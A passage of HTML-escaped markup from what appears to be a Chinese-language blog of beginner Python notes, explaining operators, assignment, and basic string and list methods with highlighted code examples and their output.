punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;浮点数计算中可能出现不精确的情况，另行解决。&lt;/p&gt;
&lt;p&gt;字符串在多换行显示用 ‘’‘xxx’‘’   or   “”“xxx”“”&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;4print注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4print注意&#34;&gt;#&lt;/a&gt; 4.print 注意&lt;/h2&gt;
&lt;p&gt;在一句 printf () 里，不能同时出现多种数据类型，但可以用 str () /int () /  float ()&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;5计算和定义注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5计算和定义注意&#34;&gt;#&lt;/a&gt; 5. 计算和定义注意&lt;/h2&gt;
&lt;p&gt;在 py3 里&lt;/p&gt;
&lt;p&gt;** 表示乘方&lt;/p&gt;
&lt;p&gt;// 表示整除&lt;/p&gt;
&lt;p&gt;数字很大时，可以用下划线来分隔，更清晰易读，py 不会打印下划线&lt;/p&gt;
&lt;p&gt;相比于 c 语言，py 可以这样赋值： x, y, z = 0, 0, 0&lt;/p&gt;
&lt;p&gt;常量一般用全大写表示&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;6总结一些常用的方法后面遇到的也写到这里了&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6总结一些常用的方法后面遇到的也写到这里了&#34;&gt;#&lt;/a&gt; 6. 总结一些常用的方法（后面遇到的也写到这里了）&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;title()&lt;/strong&gt;	以首字母大写的方式显示每个单词&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;ada lovelace&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;title&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Ada Lovelace&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;upper()&lt;/strong&gt;	全大写字母显示单词&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;lower()&lt;/strong&gt;	全小写字母显示单词&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;ada lovelace&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;upper&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ADA LOVELACE&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ada lovelace&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;format()&lt;/strong&gt;	这个方法在 3.6 以后的版本已经换为用  f 字符  连接字符串了（所以只写了 f 字符的用法）&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;first_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;ada&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;last_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;lovelace&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;full_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;first_name&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt; &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;last_name&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;Hello, &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;full_name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;title&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;!&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Hello&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Ada Lovelace&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;rstrip()&lt;/strong&gt;	删除末尾空白&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;lstrip()&lt;/strong&gt;	删除开头空白&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;strip()&lt;/strong&gt;	 删除字符串两边的空白&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;language_1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;python &#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;language_2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; python&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;language_1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; language_1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;language_2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; language_2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;language_1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;language_2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;append()&lt;/strong&gt;	在列表末尾添加元素&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;insert()&lt;/strong&gt;		在列表的任何位置添加元素&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;honor&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;#换行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;insert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;honor&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;honor&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;honor&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;del 语句&lt;/strong&gt;	删除元素，需要知道元素的位置&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;pop()&lt;/strong&gt;		当需要删除值并接着使用时，用 pop，否则可以用 del 语句删除&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;remove()&lt;/strong&gt;		根据值删除元素&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; phones&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;#换行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;buy &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; phones&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;I will buy &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;buy&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt; phone.&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token 